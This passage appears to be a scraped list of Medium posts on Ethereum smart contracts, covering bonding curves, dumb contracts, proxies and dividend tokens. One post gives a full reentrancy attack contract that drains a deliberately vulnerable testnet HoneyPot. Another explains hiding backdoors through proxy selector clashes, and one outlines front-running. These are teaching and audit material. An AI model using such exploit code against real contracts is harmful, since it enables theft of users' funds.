/ (currentPrice * tokenSupply)In our y=x\u00b2 function, poolBalance = 1/3 * tokenSupply\u00b3, so we can rewrite the reserve ratio formula:reserveRatio = 1/3 * tokenSupply\u00b3 / (tokenSupply\u00b2 * tokenSupply) = 1 / 3So we can express our quadratic curve as a token with reserve ratio of 1/3. Similarly, y=x is a curve with a reserveRatio of \u00bd and y=sqrt(x) is a curve with a reserveRatio of \u2154.Bancor\u2019s formula allows us to compute token prices for arbitrary curves with reserve ratios between 0 -100%, (you can read more details about in their white paper). In fact their own BNT token can be bought and sold via a smart contract with a 1/10 reserve ratio.Here is their solidity implementation with some fancy tricks to compute fractional exponents of fractions:bancorprotocol/contractscontracts - Bancor Protocol Contractsgithub.comHere is an implementation of a simple universal bonding curve I put together using the Bancor formula:relevant-community/contractscontracts - Relevant Bonding Curve and Token Contractsgithub.comThe gas prices to buy and sell the token are slightly higher than the specific cases, but still very reasonable.ImplicationsBonding Curves allow us to create some cool token models.LiquidityThe obvious advantage is instant liquidity\u200a\u2014\u200ayou can create a contract and have anyone be able to buy and sell your token right away.Bid-Ask Spreads & Dynamic Inflation RateSince the contract functions as a market maker, you can define your own bid-ask spread and charge a small premium when users buy or sell tokens and generate income from providing liquidity. This is also a way to mitigate pump-n-dump attacks while the token is its nascency\u200a\u2014\u200aattack will be less profitable if we use a sell curve with a lower reserve ratio.What is even more interesting, is that you can define separate (even dynamically computed) buy and sell curves. Again, these function as dynamic bid-ask spreads and allow you to allocate the proceeds however you like.At Relevant we plan on using a bid-ask spread in order to create an inflationary token with a dynamically calculated inflation rate. The newly minted tokens will be used to reward users for curating quality news feeds.Example of a token with a dynamic inflation rate:Initialization:maxInflationRate = 10%startRatio = 20%minReserveRatio = 10%As above, our reserve ratio is:reserveRatio = poolBalance / (totalSupply * tokenPrice)but it is now dynamic since the total supply increases with inflation.Our \u2018buy\u2019 curve is based on a 20% startRatio and our \u2018sell\u2019 curve is dynamically calculated from the actual reserve ratio but is not allowed to fall below 10%.red = sell curve, yellow = buy\u00a0curveWe start with both curves based on a 20% reserve ratio, but as time passes, we mint new tokens based on inflation rate. As a result, our supply increases but poolBalance stays the same. This starts pushing the sell curve closer to the 10% ratio. As this happens, we adjust our inflation rate to equal 20%\u200a\u2014\u200areserveRatio. As the reserveRatio gets closer to a 10% ratio, inflation goes to 0%. However if there is a lot of demand for the token, and people are buying based on the 20% curve, the reserveRatio moves up closer to 20% and inflation increases toward the max 10% rate.Eventually exchanges will be able to offer a more competitive bid-ask spread than our contract. Once our token becomes liquid enough to be traded on exchanges, the majority of trading will start happening there, with a price somewhere in between the bid-ask spread offered by the contract. Once the exchange price moves above or below the buy/sell curves, the contract will present an arbitrage opportunity, adjust the inflation rate and mint or burn tokens as needed to match the exchange prices.Bonding Curve and\u00a0ICOsYou can do an ICO with a bonding curve token. Bancor ICO is one such example. They used 20% of the funds raised in their ICO to initialize a 10% bonding curve token contract. Half of the total supply of the tokens was distributed to ICO contributors and half to the founders. As a result the 10% of the total market cap of the tokens was backed by Ether.Bancor token sale, however was far from exemplary and much closer in design to a vanilla incapped ICO. The main novelty was immediate token liquidity and dynamic token supply.A more novel approach would be to launch your token and have it be liquid before conducting an ICO\u200a\u2014\u200athis dynamic is particularly great for testing market demand for utility tokens before doing a sale.Here is how you do it:Create a bonding curve with your desired reserveRatio, for example 20%.At token launch, allocate an icoFund\u200a\u2014\u200aamount of tokens controlled by the contract owner, not backed by Ether and not tradable via the contract.Let users buy and sell tokens based on a curve that takes icoFund into account (totalSupply = tradableTokens + icoFund). The calculation assumes the icoFund tokens are backed by assets even though they are not, however this is fine because the tokens in the icoFund are not tradable.Announce the ICO start time and set price at current token price\u200a\u2014\u200athis will create an automatic cap = currentPrice * tokens in icoFund.When participants send Ether to the ICO contract, deposit 20% of the balance into the token contract poolBalance, convert an appropriate amount of icoFund tokens into regular tokens and send them to the participants.Creating separate buy-sell curves and making it less profitable to sell tokens right away can also limit pump and dump risks.This model can still be abused to defraud investors, however if set up correctly and with full transparency, it can offer protection from pump-n-dump manipulation and abuse by founders.Intra-Network \u201clocal-tokens\u201dAs both Chris Burniske and Simon de la Rouviere propose, local bonding curve tokens can be used within a tokenized platform to incentivise users to create sub communities or curate sub topics via a Token Curated Registries.Continuous Token-Curated Registries: The Infinity of Lists\u201cToken-curated registries are decentrally-curated lists with intrinsic economic incentives for token holders to curate\u2026medium.comAttack Vectors &\u00a0SecurityFront-running AttackBonding curves are susceptible to front-running attacks. This is when an adversary watches for a big buy order coming in and sends her own buy order with more gas to cut ahead of the original order. Once the original order is executed, the attacker sells her tokens at a guaranteed profit. You can read more about this exploit in the Bancor protocol here:Implementing Ethereum trading front-runs on the Bancor exchange in PythonThis post is a deep-dive into programmatically trading on the Ethereum / Bancor exchange and exploiting a\u2026hackernoon.comBancor\u2019s proposed solution is to set a limit on gas price buyers and sellers can submit and encourage everyone to use the maximum allowed gas price when sending their orders. This prevents the adversary from having their order executed ahead of the already-submitted orders.Another, less effective fix is to ask users to submit a minimum token amount they would like to buy. This way if the price has increased after the order was submitted, it won\u2019t execute unless the contract is able mint the minimum amount.Deep-Nested Bonding Curves Increase\u00a0RiskIn the case where we have several layers of child tokens, each with their own bonding curve the risks are compounded.Lets say Alice creates a platform token with a 10% reserve ratio backed by Ether. She lets users create an arbitrary amount of child tokens, each with their own children and bonding curves.Bob creates his own token with a 50% reserve ratio backed by Alice\u2019s token. Bob\u2019s token\u2019s price is now backed by only\u00a0.1 *\u00a0.5 = 5% of Ether.Carol creates a token with a 20% reserve of Bob\u2019s token. Carol\u2019s token is now only backed by\u00a0.1 *\u00a0.5 *\u00a0.2 = 1% of Ether and will be extremely volatile.Platforms will need to figure out ways to limit these scenarios and make the risks transparent to the users. One solution is to limit nesting reserve ratio so that they don\u2019t exceed a minimum compounded reserve ratio.", "responses": "8"}, {"title": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u00a0Contract", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4?source=search_post", "post_date": "May 25, 2017", "readtime": "4 min read", "upvotes": "1.2K", "content": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack\u00a0ContractGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingMay 25, 2017To code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not only your money but also other people\u2019s as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are being defined and redefined by the day so one need to be always updated and akin to smart contract security best practices.As a student of smart contract security, I have been on the look out for vulnerabilities in code. Recently the educators at Team B9lab informed me of this contract deployed to the testnet.pragma solidity ^0.4.8;contract HoneyPot {  mapping (address => uint) public balances;  function HoneyPot() payable {    put();  }  function put() payable {    balances[msg.sender] = msg.value;  }  function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }  function() {    throw;  }}The HoneyPot contract above originally contained 5 ether and was deliberately devised to be hacked. In this blog post I want to share with you how I attacked this contract and \u2018collected\u2019 most of its ether.The Vulnerable ContractThe purpose of the HoneyPot contract above is to keep a record of balances for each address that put() ether in it and allow these addresses to get() them later.Let\u2019s look at the most interesting parts of this contract:mapping (address => uint) public balances;The code above maps addresses to a value and store it in a public variable called balances\u00a0. It allows to check the HoneyPot balance for a address.balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]The put() function below is where the storage of the ether value happens in the contract. Note that msg.sender here is the address from the sender of the transaction.function put() payable {    balances[msg.sender] = msg.value;  }This next function we find where the exploitable is. The purpose of this function is to let addresses to withdraw the value of ether they have in the HoneyPot balances.function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }Where is the exploitable and how can someone attack this you ask? Check again these lines of code out:if (!msg.sender.call.value(balances[msg.sender])()) {      throw;}balances[msg.sender] = 0;HoneyPot contract sets the value of the address balance to zero only after checking if sending ether to msg.sender goes through.What if there is an AttackContract that tricks HoneyPot into thinking that it still has ether to withdraw before AttackContract balance is set to zero. This can be done in a recursive manner and the name for this is called reentrancy attack.Let\u2019s create one.Here is the full contract code. I will attempt my best to explain its parts.pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;  function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);  }  function kill () {    suicide(msg.sender);  }  function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }  function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }}The first few lines is basically assigning the solidity compiler to use with the contract. Then we import the HoneyPot contract which I put in a separate file. Note that HoneyPot is referenced throughout the HoneyPotCollect contract. And we set up the contract base which we call it HoneyPotCollect\u00a0.pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;...}Then we define the constructor function. This is the function that is called when HoneyPotCollect is created. Note that we pass an address to this function. This address will be the HoneyPot contract address.function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);}Next function is a kill function. I want to withdraw ether from the HoneyPot contract to the HoneyPotCollect contract. However I want also to get the collected ether to an address I own. So I add a mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address that calls the kill function.function kill () {  suicide(msg.sender);}The following function is the one that will set the reentrancy attack in motion. It puts some ether in HoneyPot and right after it gets it.function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }The payable term here tells the Ethereum Virtual Machine that it permits to receive ether. Invoke this function with also some ether.The last function is what is known as the fallback function. This unnamed function is called whenever the HoneyPotCollect contract receives ether.function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }This is where the reentrancy attack occur. Let\u2019s see how.The AttackAfter deploying HoneyPotCollect, call collect() and sending with it some ether.HoneyPot get() function sends ether to the address that called it only if this contract has any ether as balance. When HoneyPot sends ether to HoneyPotCollect the fallback function is triggered. If the HoneyPot balance is more than the value that it was sent to, the fallback function calls get() function once again and the cycle repeats.Recall that within the get()function the code that sets the balance to zero comes only after sending the transaction. This tricks the HoneyPot contract into sending money to the HoneyPotCollect address over and over and over until HoneyPot is depleted of almost all its ether.Try it yourself. I left 1 test ether in this contract so others could try it themselves. If you see no ether left there, then it is because someone already attacked it before you.I originally created this code for the HoneyPotAttackusing the Truffle framework. Here is the code in case you need it for reference. Enjoy!", "responses": "9"}, {"title": "Stateless Smart Contracts", "author_name": "James Childs-Maidment", "link": "https://medium.com/@childsmaidment/stateless-smart-contracts-21830b0cd1b6?source=search_post", "post_date": "Aug 16, 2017", "readtime": "4 min read", "upvotes": "1K", "content": "Stateless Smart ContractsJames Childs-MaidmentBlockedUnblockFollowFollowingAug 16, 2017The stateless smart contract or dumb contract is a design pattern used to drastically reduce the gas cost of Ethereum smart contracts.A stateless design comes in two parts:The Dumb ContractThe FilterDumb ContractHere is how you might write a standard datastore contract:contract DataStore {    mapping(address => mapping(bytes32 => string)) public store;        event Save(address indexed from, bytes32 indexed key, string value);        function save(bytes32 key, string value) {        store[msg.sender][key] = value;        Save(msg.sender, key, value);    }}Let\u2019s say we want to save the following key / value pair using the contract above:key: \u201cethereum\u201dvalue: \u201cEthereum is a decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third party interference.\u201dThis transaction will cost 181,181 gas (or 89,797 gas if we use IPFS).If we follow a stateless design our contract would look like this:contract DataStore {    function save(bytes32 key, string value) {}}That\u2019s it. We don\u2019t store any contract state and we don\u2019t fire off events. We implement the rest of the logic off-chain. If we use the same data as above the transaction costs 35,721 gas (or 25,841 gas if we use IPFS) which is an 80% reduction in gas cost.So if we aren\u2019t saving any contract state how do we access our data?Take a look at this transaction on Etherscan, scroll down to Input Data, and click the Convert To Ascii button. Our data lives in the input of the transaction.FilterA Filter processes the transactions of a dumb contract and provides an interpretation of that data.In a standard dapp we would interact with a smart contract like this:Frontend => Web3 => Ethereum Network => Web3 => FrontendIn a stateless design we do the following:Frontend => Web3 => Ethereum Network => Backend => FrontendWhen a user interacts with our dumb contract from the frontend (using something like MetaMask) we watch for incoming transactions on the backend and process them.For example, using the information in the transaction above, we can implement the logic from the standard version of the datastore contract off-chain.We can use InputDataDecoder to recover information from the transaction inputs:const abi = [  {    constant: false,    inputs: [      { name: \"key\", type: \"bytes32\" },      { name: \"value\", type: \"string\" }    ],    name: \"save\",    outputs: [],    payable: false,    type: \"function\"  }];const decoder = new InputDataDecoder(abi);const decodeInput = input => decoder.decodeData(input);We need to do a little extra processing to recover our bytes32 key arg:const processArgs = input =>  input.inputs.map((arg, i) => {    const type = input.types[i];    if (type === \"string\") {      return arg;    }    if (type === \"bytes32\") {      const toHex = `0x${arg.toString(\"hex\")}`;      return web3.toUtf8(toHex);    }    return arg;  });Tying it all together:const run = async () => {  const tx = \"0xc9fdf51d...\";  const transaction = await web3.eth.getTransaction(tx);  const input = decodeInput(transaction.input);  if (input.name === \"save\") {    const args = processArgs(input);    const address = transaction.from;    const key = args[0];    const value = args[1];    // save the address / key / value to a database  }};We can now save the key / value under the address that the transaction was sent from in a database that provides a better user experience.Extras DetailsYou can apply various levels of statelessness to your contract depending on your needs. For example, you can store usernames in a registry to enable other smart contracts to identify users.function registerUsername(bytes32 username) external {        var hasUsername = usernames[msg.sender];        var isOwned = addresses[username];        if (isOwned != 0) throw; // prevents registration of existing username        if (hasUsername != 0) throw; // prevents registered address from registering another username        if (!isLowercase(username)) throw; // username must be lowercase        usernames[msg.sender] = username;        addresses[username] = msg.sender;    }Meanwhile, you can keep other content completely stateless.function post(string data) external {  var username = usernames[msg.sender];  if (username == 0) throw; // user must be registered}TamperingUsers can easily validate whether or not a Filter provider is tampering with content by looking at the inputs of transactions on the blockchain.However, tampering can be positive! A Filter can enhance stateless content with metadata, media, links, and handles.One of the great things about dumb contracts is that anyone can build a Filter on top of one and provide their own interpretation of the data. If you are worried about censorship you can also open source your Filter to allow others to spin up your interpretation.Trade-OffsA stateless design is only useful for certain types of projects. Keep these trade-offs in mind:A stateless design requires a mix of decentralization and centralization to provide the best user experience / gas cost.Other contracts cannot access your data.If your contract has no events you must processes every block to find relevant transactions. This can be mitigated by firing off empty events with marginal extra gas costs.That\u2019s it, I hope you found this educational!", "responses": "12"}, {"title": "How Daox Works\u200a\u2014\u200aPart\u00a02", "author_name": "Anton Vityazev", "link": "https://medium.com/daox/how-daox-works-part-2-824e01b477b9?source=search_post", "post_date": "May 18, 2018", "readtime": "9 min read", "upvotes": "660", "content": "How Daox Works\u200a\u2014\u200aPart\u00a02Managing DAOAnton VityazevBlockedUnblockFollowFollowingMay 18, 2018In the previous part of this article the process of a DAO creation and the process of crowdsale were explained. This part explains what types of votings are presented in DAOs and how they work.All code presented in this article is provided with\u00a0.js extension only for correct highlight. The real extension is\u00a0.sol", "responses": ""}, {"title": "", "author_name": "", "link": "https://medium.com/loom-network/plasma-cash-initial-release-plasma-backed-nfts-now-available-on-loom-network-sidechains-37976d0cfccd?source=search_post", "post_date": "", "readtime": "", "upvotes": "", "content": "", "responses": ""}, {"title": "Loom Network SDK Alpha Release\u200a\u2014\u200aFirst 5 DAppChains Announced + SDK\u00a0Roadmap", "author_name": "Matthew Campbell", "link": "https://medium.com/loom-network/loom-network-sdk-alpha-release-first-5-dappchains-announced-sdk-roadmap-1dddec789004?source=search_post", "post_date": "Apr 2, 2018", "readtime": "5 min read", "upvotes": "2.4K", "content": "Loom Network SDK Alpha Release\u200a\u2014\u200aFirst 5 DAppChains Announced + SDK\u00a0RoadmapMatthew CampbellBlockedUnblockFollowFollowingApr 2, 2018Updates:We publicly released the Loom SDK beta in June, 2018. Check out the announcement and the docs site.We now also have 3 shared DAppChains running in production: PlasmaChain, GameChain, and SocialChain.", "responses": "11"}, {"title": "Ethereum: Signing and Validating", "author_name": "Angello Pozo", "link": "https://medium.com/@angellopozo/ethereum-signing-and-validating-13a2d7cb0ee3?source=search_post", "post_date": "Jun 9, 2017", "readtime": "4 min read", "upvotes": "1K", "content": "Ethereum: Signing and ValidatingAngello PozoBlockedUnblockFollowFollowingJun 9, 2017A core primitive of Ethereum and other cryptocurrencies is the ability to sign data that can be verified by anyone. This powers the distributed nature of blockchain. In Bitcoin you sign a transaction saying you want to give Sally 4 bitcoin. Without this property, anyone could make fake transactions giving themselves all coins.", "responses": "18"}, {"title": "Malicious backdoors in Ethereum\u00a0Proxies", "author_name": "Patricio Palladino", "link": "https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357?source=search_post", "post_date": "Jun 1, 2018", "readtime": "5 min read", "upvotes": "1.4K", "content": "Malicious backdoors in Ethereum\u00a0ProxiesA detailed explanation on how the Proxy pattern for smart contract upgradeability can be exploited.Patricio PalladinoBlockedUnblockFollowFollowingJun 1, 2018We recently audited the initial release of ZeppelinOS and discovered a vulnerability in the Proxy Pattern, which is used to implement virtually all upgradeable smart contracts.This vulnerability lets an attacker conceal malicious code that can be very difficult to spot without a deep understanding of how Solidity and the Proxy Pattern work. This has already been fixed on ZeppelinOS.Solidity function calls\u2019 internalsA simple smart contract written in\u00a0SolidityIf you are a developer building for Ethereum you most likely code and think about your smart contracts in terms of Solidity, but that\u2019s not how the network works with them.From the network\u2019s perspective, a smart contract is an account with a single chunk of code associated to it. If any other account sends a message\u00b9 to the contract, its code will be executed on the EVM.So how is it possible to call different functions if the contract only has one piece of consecutive code?Ethereum defines a standard way of communicating between its components, which is the Application Binary Interface, or ABI for short. You can think of it as a low-level API, specifying not only which features are available in the system, but also how many things that we normally take for granted work. Some of these things are how functions should be called, how to pass them arguments, and how they return values.The Ethereum ABI dictates that the data parameter of your transaction must start with a function selector, which identifies which method you are trying to call. Using the selector your contract\u2019s code jumps to the portion of itself that implements the function you\u2019re trying to call.Function selectors are just the first four bytes of thesha3 hash of the function\u2019s signature. For example, the get\u2019s selector is computed as sha3(\u201cget()\u201d)[0:4], which gives us 0x6d4ce63c. Similarly, set's one is the result of sha3(\u201cset(uint256)\u201d)[0:4].There is only one exception to function selectors and that\u2019s for the fallback function present in every smart contract, which doesn\u2019t have a selector. It has the special behavior of being called when no data parameter is provided, or when the given selector doesn\u2019t match any of the contract\u2019s methods.The Proxy Pattern revisitedMuch has been written about the Proxy Pattern, its different variations and their trade-offs. Regardless of the proxy pattern you choose, its core functionality will be the same: it forwards\u00b2 all messages it receives to the current implementation of the contract.Let\u2019s take a look at how this works.A proxy contract implementationDon\u2019t worry, you don\u2019t need to understand how that scary assembly block works. It forwards the current message to the implementation, sending it the exact same dataparameter it received.Placing the forwarding logic in the fallback function allows us to forward any call into Proxy, supposedly. Turns out, this doesn\u2019t quite always happen.The Proxy also needs its own meta-functionality, as it needs to be upgradeable. So functions like implementation() and proxyOwner() won\u2019t be forwarded, given that they exist and the fallback function isn\u2019t executed.Proxy selector\u00a0clashingBeing a clever Ethereum dev, you may have realized that any function in the Proxy contract whose selector matches with one in the implementation contract will be called directly, completely skipping the implementation code.Because the function selectors use a fixed amount of bytes, there will always be the possibility of a clash. This isn\u2019t an issue for day to day development, given that the Solidity compiler will detect a selector clash within a contract, but this becomes exploitable when selectors are used for cross-contract interaction. Clashes can be abused to create a seemingly well-behaved contract that\u2019s actually concealing a backdoor.Armed with some rust code, we found that clash550254402() has the same selector as proxyOwner(). It took less than 15 minutes to find it in a newish Macbook Pro. A motivated hacker can optimize the process and dedicate much more resources to finding discrete-looking function names.ExploitabilityThe Proxy pattern is the current approach being used across the Ethereum ecosystem to make smart contracts upgradeable, and the selector clashing attack allows any project using it\u200a\u2014\u200aor an attacker who\u2019s obtained access to the upgrading mechanism\u200a\u2014\u200ato deploy code that conceals malicious functionality.For example, most upgradability implementations have some notion of state migrations, which are functions that upgrade the contract\u2019s storage. These are especially useful to disguise a selector clash given that auto-generated strings, like commit numbers, can be acceptable names for those functions, making a selector clash attack easy to disguise.In the context of the security audit we conducted on ZeppelinOS, we found that this could be exploited by anyone and not just the Proxy owner, given that they intend to let any user of the network deploy implementations for other users to use. As another example, a function call that seems to move funds as it should may actually not be called at all, stealing someone\u2019s money.Proposed solutionBefore we found this vulnerability, Francisco Giordano from Zeppelin was already working on Transparent Proxies. It is an improved technique intended to let implementation contracts use the same function names as the Proxy without the possibility of a selector clash. This eliminates the attack.These new proxies work by forwarding any call as long as they don\u2019t come from the Proxy owner. Clashes still exist, but if the caller is anyone other than the Proxy owner, the call is forwarded. This makes the Proxy owner the only account that can fall into a clash, hence users not exposed to concealment.The only drawback is that other users won\u2019t be able to read the Proxy's own state (i.e. owner and implementation) using its ABI. They will need to use web3.eth.getStorageAt() instead. This is a reasonably small price to pay for being certain that upgradable contracts do exactly what their implementation source code shows.Exercise for the\u00a0readerFor those who want to dig deeper in how this vulnerability can be exploited, we put together a small exercise. Your task is to try to steal the ropsten-ETH in this contract, and figure out what\u2019s happening. Keep in mind that it is a Proxy contract, so you should take a look at its implementation too.You can do whatever you want with those contracts, just don\u2019t fully empty its balance so other people can also play.NotesMessages are how accounts communicate with each other. When you send a transaction, you are sending a message to another account. They are usually called internal transactions when the sender is a contract.Messages are not actually forwarded like in a traditional proxy. What\u2019s happening is that we execute the implementation\u2019s code as if it were the proxy\u2019s via a delegatecall.", "responses": "5"}, {"title": "How Daox Works\u200a\u2014\u200aPart\u00a01", "author_name": "Anton Vityazev", "link": "https://medium.com/daox/how-daox-works-part-1-a1d2a456cbe7?source=search_post", "post_date": "May 15, 2018", "readtime": "7 min read", "upvotes": "487", "content": "How Daox Works\u200a\u2014\u200aPart\u00a01Creating a DAO and Raising\u00a0FundsAnton VityazevBlockedUnblockFollowFollowingMay 15, 2018This article is to help developers and people who are interested in the Daox project understand how this platform works, what the main stages of lifecycle for each created DAO are, and how different components of the platform connect with each other. The first part explains and describes lifecycle stages starting from the creation of a DAO and to the end of the crowdsale. By DAO we mean Daox-based organization (a DAO created using Daox smart contracts on the Ethereum blockchain).All code presented in this article is provided with\u00a0.js extension only for correct highlight. The real extension is\u00a0.sol", "responses": "2"}, {"title": "React & Ethereum: Getting Started With The Minimum Toolset Required\u200a\u2014\u200aPart 1 of\u00a04", "author_name": "Zubair Ahmed", "link": "https://levelup.gitconnected.com/https-medium-com-zubairnahmed-react-ethereum-getting-started-with-the-minimum-toolset-required-part-1-of-4-9562efa23d18?source=search_post", "post_date": "Nov 8, 2017", "readtime": "9 min read", "upvotes": "1.2K", "content": "React & Ethereum: Getting Started With The Minimum Toolset Required\u200a\u2014\u200aPart 1 of\u00a04Zubair AhmedBlockedUnblockFollowFollowingNov 8, 2017Learn how to create a smart contract and deploy it to the Ethereum blockchain, using the minimum toolset required: Remix, Metamask, and any text editor.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022 Part 1 \u2022\u2022\u2022 Part 2 \u2022\u2022\u2022 Part 3 \u2022\u2022\u2022 Part 4 \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022Pixabay image, released under Creative Commons\u00a0CC0.Update: This blog series is no longer maintained.IntroductionThe essence of this post is to show how React can talk with the Ethereum blockchain. Only three tools will be used, so there\u2019ll be a minimum learning curve. The project will be broken down into five phases so it can be easily followed.Intended audience: Students / beginners / intermediate beginners, and anyone with curiosity.Prerequisites: Basic familiarity with JavaScript, React, npm, and the command line. Simple knowledge of ether and gas.Solidity will be used to write our smart contract, though familiarity with it is not needed. I\u2019ll do my best to explain what\u2019s happening, and I\u2019ll link relevant key words to the Solidity documentation for easy reference.Design note: I\u2019m designing this post to be a learning experience which aims to deliver a simple and detailed understanding of the toolset used and the Solidity programming language. Practicing, recalling from memory, and following processes are part of this experience.GitHub repository: If you\u2019d like, you can code along with my repository. I\u2019ve added comments as a guide.", "responses": "4"}, {"title": "", "author_name": "", "link": "https://medium.com/@adrianmcli/rapid-ethereum-dapp-development-with-next-js-f6354400e4d4?source=search_post", "post_date": "", "readtime": "", "upvotes": "", "content": "", "responses": ""}, {"title": "Dividend-bearing tokens on\u00a0Ethereum", "author_name": "Nick Johnson", "link": "https://medium.com/@weka/dividend-bearing-tokens-on-ethereum-42d01c710657?source=search_post", "post_date": "May 2, 2017", "readtime": "5 min read", "upvotes": "744", "content": "Dividend-bearing tokens on\u00a0EthereumNick JohnsonBlockedUnblockFollowFollowingMay 2, 2017My lawyer would want me to say this: The article below is about the computer science and software engineering aspects of writing a token contract. It is not securities or accounting advice; please do not take it as such. I\u2019m writing this as an individual, not a member of the Ethereum Foundation.One thing I\u2019ve seen come up frequently on the Solidity channel of late is the idea of dividend-bearing ERC20 tokens, and the calculations needed to support them. A naive implementation of disbursing dividends works something like this:struct Account {  uint balance;}Account[] accounts;uint totalSupply;function disburse(uint amount) {  deduct(msg.sender, amount);  for(var i = 0; i < accounts.length; i++) {    accounts[i].balance += (amount * accounts[i].balance) / totalSupply;  }}We\u2019ll ignore for a moment that you can\u2019t iterate over maps in Solidity to address the real issue: this function has to do work proportional to the number of token holders, which means you rapidly hit the block gas limit.With further work, it\u2019s possible to split this up into multiple transactions, but apart from being complex and prone to implementation bugs, it\u2019s still impractical for tokens with a lot of users and frequent dividends, and it wastes a lot of gas doing duplicate calculations for users who aren\u2019t making any transactions between dividend rounds.Fortunately, there is a better way\u200a\u2014\u200aand an excellent excuse to talk about one of the most useful design patterns in smart contracts: amortisation of work.A better\u00a0wayAny loop like the one in the snippet above should set your spidey-sense tingling, and the first thing you should look for is a way to amortise the work being done\u200a\u2014\u200athat is, to break it up over many other operations. In this case, instead of updating every user\u2019s account at once, we can keep track of the total dividends, and add a user\u2019s pending dividends when there\u2019s a transaction against their account. Here\u2019s a quick sketch of how it would work:struct Account {  uint balance;  uint lastDividends;}mapping(address=>Account) accounts;uint totalSupply;uint totalDividends;function dividendsOwing(address account) internal returns(uint) {  var newDividends = totalDividends - accounts[account].lastDividends;  return (accounts[account].balance * newDividends) / totalSupply;}modifier updateAccount(address account) {  var owing = dividendsOwing(account);  if(owing > 0) {    accounts[account].balance += owing;    accounts[account].lastDividends = totalDividends;  }  _;}function disburse(uint amount) {  totalDividends += amount;  deduct(msg.sender, amount);}Then, we make sure to apply the updateAccount modifier to all functions that modify an account balance, to update any associated accounts\u2019 balances before they\u2019re operated on by the rest of our code.Presto! All of our users automatically get dividends in a manner that avoids having to do an unbounded amount of work in any one transaction. If a user transacts infrequently, we even save net gas, since the user only needs to do one dividend calculation in total.There\u2019s still two problems with this, however: rounding errors, and the assumption of a fixed totalSupply.Rounding ErrorsThe code above makes the assumption that the dividend can be evenly divided across all accounts, with no rounding errors. This isn\u2019t true, of course, and the result will be a few wei lost to rounding errors.In the grand scheme of things, this is a trivial amount of money, but it does mean breaking the invariant that the totalBalance is the sum of all balances, which complicates reasoning about the contract, and will throw off any attempt to reconcile the contract\u2019s current balances. In general, it\u2019s not great to lose track of money, even trivial amounts of it.One solution to this is to explicitly keep track of a dividend account with its own balance. Whenever you pay out dividends to an account, subtract the same amount from the dividend account. The amount in the dividend account, then, is all the unclaimed dividends plus the rounding errors. The rounding errors are still effectively burned, but they\u2019re no longer unaccounted for.Changing the totalSupplyThe second complication arises if we want to be able to change the totalSupply, either to mint or destroy tokens, or so that the dividend can be paid from outside. The code above assumes that the total supply is fixed; if it isn\u2019t, users will get different proportions of dividends based on how the supply has varied since the dividend was issued.Can we fix the scheme above to work in the presence of a varying total balance? It turns out we can. To see how, it helps to start by analysing what we\u2019re actually trying to calculate.If we go way back to the original naive algorithm, we can describe the dividends a user receives over time as a running sum:(D_1 * B) / S_1 + ... + (D_n * B) / S_nWhere D_n represents the amount of the nth dividend, B is the user\u2019s balance (it doesn\u2019t change, because we assume we will take all dividends before sending or receiving funds), and S_n is the total supply at the time of dividend n.In our first refactor, we assumed S == S_1 ==\u00a0... == S_n\u200a\u2014\u200athat is, that the total supply never changes. That allowed us to rewrite the equation as:((D_1 + ... + D_n) * B) / SThat is, to sum up all the unpaid dividends and pay them all out at once. We can do a similar rearrangement without the assumption that the supply is constant, though, giving us this equation:(D_1 / S_1 + ... + D_n / S_n) * BThat is, instead of storing the sum of total dividends so far, we store the sum of dividend percentages so far. To calculate a user\u2019s dividends owing, we then calculate (totalDividendPercent\u200a\u2014\u200alastDividendPercent) * balance!One final issue remains: S_n will generally be larger than D_n, and we\u2019re working with integers, so all our percentages will round down to zero. This is easily fixed, however\u200a\u2014\u200ajust multiply both sides by a large constant integer. So our final equation is:(D_1 * X / S_1 + ... + D_n * X / S_n) * B / XTo minimise rounding errors, we pick a large number for X\u200a\u2014\u200asay, 10\u00b9\u2078. This gives us teeny tiny rounding errors, but still allows plenty of headroom for large token balances (with 10\u00b9\u2078 for X, we won\u2019t overflow until someone\u2019s balance exceeds about 10\u2075\u2079 tokens).The final code, then, looks something like this:const uint pointMultiplier = 10e18;struct Account {  uint balance;  uint lastDividendPoints;}mapping(address=>Account) accounts;uint totalSupply;uint totalDividendPoints;uint unclaimedDividends;function dividendsOwing(address account) internal returns(uint) {  var newDividendPoints = totalDividendPoints - accounts[account].lastDividendPoints;  return (accounts[account].balance * newDividendPoints) / pointMultiplier;}modifier updateAccount(address account) {  var owing = dividendsOwing(account);  if(owing > 0) {    unclaimedDividends -= owing;    accounts[account].balance += owing;    accounts[account].lastDividendPoints = totalDividendPoints;  }  _;}function disburse(uint amount) {  totalDividendPoints += (amount * pointsMultiplier / totalSupply);  totalSupply += amount;  unclaimedDividends += amount;}", "responses": "7"}, {"title": "Avoiding out-of-gas error in large Ethereum smart contracts", "author_name": "Kirill Bulgakov", "link": 